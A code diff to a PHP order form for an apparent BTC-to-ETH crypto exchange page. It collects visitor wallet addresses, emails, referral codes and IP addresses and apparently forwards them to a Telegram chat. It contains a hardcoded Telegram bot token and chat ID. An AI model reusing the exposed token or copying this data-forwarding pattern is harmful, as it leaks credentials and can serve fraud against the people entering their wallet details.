@@ -8,7 +8,7 @@ echo $uuidV4;
 
 $send = $_POST['BTC'];
 $get = $_POST['ETH'];
-$senednumber = $_POST['value-1'];
+$sendnumber = $_POST['value-1'];
 $getnumber = $_POST['value-2'];
 $address = $_POST['addres'];
 $Email = $_POST['Email'];
@@ -16,7 +16,7 @@ $Referral = $_POST['Refferal'];
 $number_order = rand(1000000000, 9999999999);
 $_SESSION['number_order']=$_GET['number_order'];
 $token = "6179322173:AAEnTT9nflef3w0ehqwJHOroZXpZ0t_tpj0";
-$chat_id = "-1001969758729";
+$chat_id = "-1001945631506";
 
 include_once("result-XRP.php");
 include_once("waiting.php");
@@ -28,7 +28,7 @@ $data = array(
     'to_count' => $getnumber,
     'wallet' => $address,
     'email' => $Email,
-    'referal_code' => $Referral,
+    'referral_code' => $Referral,
     'from_site' => 'https://foxynex.com/index.html',
     'uuid4' => $uuidV4
 );
@@ -63,15 +63,16 @@ function get_ip()
 $ip = get_ip();
 
 $arr = array(
-  'Номер заявки ' => $number_order,
-  '----------------' => '',
-  'Отправил: ' => $sendnumber . "({$send})",
-  'Получил: ' => $getnumber . "({$get})",
-  '' => '----------------',
-  'Wallet Address' => $address,
-  'Referral' => $Referral,
-  'Email' => $Email,
-  'IP Адрес: ' =>  $ip,
+    'Номер заявки ' => $number_order,
+    '----------------' => '',
+    'Отправил: ' => $sendnumber . "({$send})",
+    'Получил: ' => $getnumber . "({$get})",
+    '' => '----------------',
+    'Wallet Address: ' => $address,
+    'Referral code: ' => $Referral,
+    'Email: ' => $Email,
+    'IP Адрес: ' =>  $ip,
+    'Uuid4: ' => $uuidV4
 );
 
 foreach($arr as $key => $value) {
